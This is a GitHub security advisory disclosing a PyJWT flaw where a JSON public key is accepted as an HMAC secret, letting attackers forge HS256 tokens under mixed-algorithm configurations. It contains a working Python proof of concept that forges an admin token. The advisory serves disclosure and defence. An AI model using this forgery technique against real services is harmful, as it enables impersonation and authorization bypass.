# [H] PyJWT: Public-key JWK accepted as HMAC secret enables forged HS256 tokens when mixed families are allowed

## Summary
Severity: High
Advisory: GHSA-xgmm-8j9v-c9wx
CVE: CVE-2026-48526
CWE: CWE-287, CWE-347
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-15
Source: https://github.com/advisories/GHSA-xgmm-8j9v-c9wx
Type: github-advisory

## Affected
- PyPI: `pyjwt` — affected >=0 <2.13.0

## Details
> [!NOTE]
> Exploitation requires a verifier configured with both symmetric and asymmetric algorithms in `algorithms=[…]` and a raw-JSON JWK as the `key=` argument, both contrary to documented usage, hence the High attack-complexity rating.

### Summary
When the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm.   

### Details
In JWT algorithm confusion attack, the verifier is mistakenly use of public key to be used as the shared secret in symmetric algorithms.
In pyjwt case, when the verifier is supporting both HMAC with other asymmetric algorithm and mistakenly using the public key of the issuer to verify the token as demonstrated in the following example:
  
`jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"])) `

An attacker who specifies in the token header to use HMAC, will cause the verifier to accept the JWK as the secret key in HMAC algorithm. 
The attacker will be able to forge JWT signed with the public key of the issuer to impersonate any user. 

If we look on current protections implemented in the library, at class HMACAlgorithm:

```
  def prepare_key(self, key: str | bytes) -> bytes:
        key_bytes = force_bytes(key)

        if is_pem_format(key_bytes) or is_ssh_key(key_bytes):
            raise InvalidKeyError(
                "The specified key is an asymmetric key or x509 certificate and"
                " should not be used as an HMAC secret."
            )

        return key_bytes
```
We can observe that there is a protection against this type of attacks but only when the verifier is using PEM format or SSH key to verify the token. JSON Web Keys, on the other hand will pass the validation.

In The following example:
`jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"])) `
There is indeed a wrong implementation of the verifier, but a stronger protection in the library side will prevent and protect against those type of misconfiugrations. 

The bypass happens only if the verifier:
 (a) allows HS* and an asymmetric algorithm in the same call and (b) passes a public-key value as key.

### PoC
Please run the code and observe the payload printed in clear text({"sub":"alice","admin":true}')

```
from jwt.api_jws import PyJWS
import json, base64, hmac, hashlib

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

# Public RSA JWK (public by design)
rsa_jwk_json = json.dumps({"kty":"RSA","n":"AQAB","e":"AQAB"})

# Attacker-crafted token: flip to HS256 and choose claims
header  = b64u(b'{"alg":"HS256","typ":"JWT"}')
payload = b64u(b'{"sub":"alice","admin":true}')
signing = header + b"." + payload

# Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret”
sig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()
token = (signing + b"." + b64u(sig)).decode()

# Vulnerable verifier: mixed families + JWK JSON string as key
jws = PyJWS()
print(jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"]))
# -> b'{"sub":"alice","admin":true}'
```


### Impact
Unauthenticated token forgery → full identity/role impersonation at the resource server (authorization bypass).

## References
- https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx
- https://nvd.nist.gov/vuln/detail/CVE-2026-48526
- https://github.com/jpadilla/pyjwt
- https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-179.yaml
